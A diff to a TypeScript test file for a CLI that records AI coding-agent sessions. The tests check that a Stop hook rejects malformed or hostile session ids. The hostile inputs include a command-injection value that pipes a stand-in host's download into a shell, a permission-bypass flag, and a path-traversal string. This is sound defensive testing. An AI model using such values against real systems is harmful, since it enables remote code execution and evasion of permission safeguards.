@@ -1,6 +1,6 @@
 import { afterEach, describe, expect, test } from "bun:test";
 import { runCommand } from "../src/commands";
-import { addSession, loadRegistry } from "../src/registry";
+import { addSession, loadRegistry, type SessionRecord } from "../src/registry";
 import { reportState, reportStopped, UNREPORTED_STOP } from "../src/report";
 import { readJournal, sampleRecord, testContext } from "./helpers";
 
@@ -110,29 +110,59 @@ describe("reportStopped (Stop hook)", () => {
         expect((await stored())?.summary?.length).toBe(200);
     });
 
-    test("fills in the harness session id from the hook input when spawn could not", async () => {
-        env = testContext();
-        await addSession(
-            env.ctx,
-            sampleRecord({ harness_session_id: null, attach: { terminal: null, resume: null } }),
-        );
-        await reportStopped(
-            env.ctx,
-            "chief-cli",
-            JSON.stringify({ session_id: "full-session-id" }),
-        );
-        expect(await stored()).toMatchObject({
-            harness_session_id: "full-session-id",
-            attach: {
-                resume: "cd '/worktrees/repo/chief-cli' && claude --resume full-session-id",
-            },
+    describe("filling in the harness session id when spawn could not", () => {
+        const sessionId = sampleRecord().harness_session_id as string;
+        const withoutSessionId = (overrides: Partial<SessionRecord> = {}) =>
+            sampleRecord({
+                harness_session_id: null,
+                attach: { terminal: null, resume: null },
+                ...overrides,
+            });
+        const stopWith = (session_id: string) =>
+            reportStopped(env.ctx, "chief-cli", JSON.stringify({ session_id }));
+
+        test("takes the hook's session id when it extends the short id", async () => {
+            env = testContext();
+            await addSession(env.ctx, withoutSessionId());
+            await stopWith(sessionId);
+            expect(await stored()).toMatchObject({
+                harness_session_id: sessionId,
+                attach: {
+                    resume: `cd '/worktrees/repo/chief-cli' && claude --resume '${sessionId}'`,
+                },
+            });
         });
+
+        test("takes any well-formed session id when the short id is unknown", async () => {
+            env = testContext();
+            await addSession(env.ctx, withoutSessionId({ harness_ref: null }));
+            await stopWith(sessionId);
+            expect((await stored())?.harness_session_id).toBe(sessionId);
+        });
+
+        for (const hostile of [
+            "x; curl evil|sh",
+            "--dangerously-skip-permissions",
+            "../../etc",
+            "0b0b0b0b-1111-4222-8333-444455556666", // well-formed, but another session's
+        ]) {
+            test(`ignores ${JSON.stringify(hostile)}`, async () => {
+                env = testContext();
+                await addSession(env.ctx, withoutSessionId());
+                await stopWith(hostile);
+                expect(await stored()).toMatchObject({
+                    harness_session_id: null,
+                    attach: { resume: null },
+                });
+            });
+        }
     });
 
     test("never overwrites a known harness session id", async () => {
         env = testContext();
         await addSession(env.ctx, sampleRecord());
-        await reportStopped(env.ctx, "chief-cli", JSON.stringify({ session_id: "other" }));
+        const other = "5f3a9c00-0000-4000-8000-000000000000";
+        await reportStopped(env.ctx, "chief-cli", JSON.stringify({ session_id: other }));
         expect((await stored())?.harness_session_id).toBe(sampleRecord().harness_session_id);
     });
 });
